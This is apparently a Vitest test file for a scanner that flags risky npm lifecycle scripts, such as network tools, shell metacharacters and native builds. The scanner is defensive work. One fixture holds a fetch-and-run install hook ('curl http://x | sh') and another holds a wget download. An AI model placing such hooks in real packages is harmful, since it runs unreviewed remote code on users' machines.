import { describe, expect, it } from 'vitest';
import { analyzeScripts } from '../src/index.js';

describe('analyzeScripts', () => {
  it('detects lifecycle scripts', () => {
    const f = analyzeScripts({
      preinstall: 'echo hi',
      postinstall: 'node install.js',
      build: 'tsc', // non-lifecycle, ignored
    });
    const kinds = f.map((x) => x.kind);
    expect(kinds).toEqual(['preinstall', 'postinstall']);
  });

  it('flags shell metacharacters', () => {
    const f = analyzeScripts({ postinstall: 'curl http://x | sh' });
    expect(f[0]!.flags).toContain('shell_metacharacters');
    expect(f[0]!.flags).toContain('network_tool');
  });

  it('flags network tools', () => {
    const f = analyzeScripts({ install: 'wget https://example.com/x' });
    expect(f[0]!.flags).toContain('network_tool');
  });

  it('flags package manager commands', () => {
    const f = analyzeScripts({ postinstall: 'npm install deps' });
    expect(f[0]!.flags).toContain('package_manager');
  });

  it('flags node-gyp native build when binding.gyp present', () => {
    const f = analyzeScripts({ install: 'node-gyp rebuild' }, true);
    expect(f[0]!.flags).toContain('node_gyp_native_build');
  });

  it('flags implicit node-gyp build when binding.gyp present and install script exists', () => {
    const f = analyzeScripts({ postinstall: 'echo setup' }, true);
    expect(f[0]!.flags).toContain('node_gyp_native_build');
  });

  it('returns empty when no lifecycle scripts', () => {
    expect(analyzeScripts({ build: 'tsc' })).toEqual([]);
  });
});
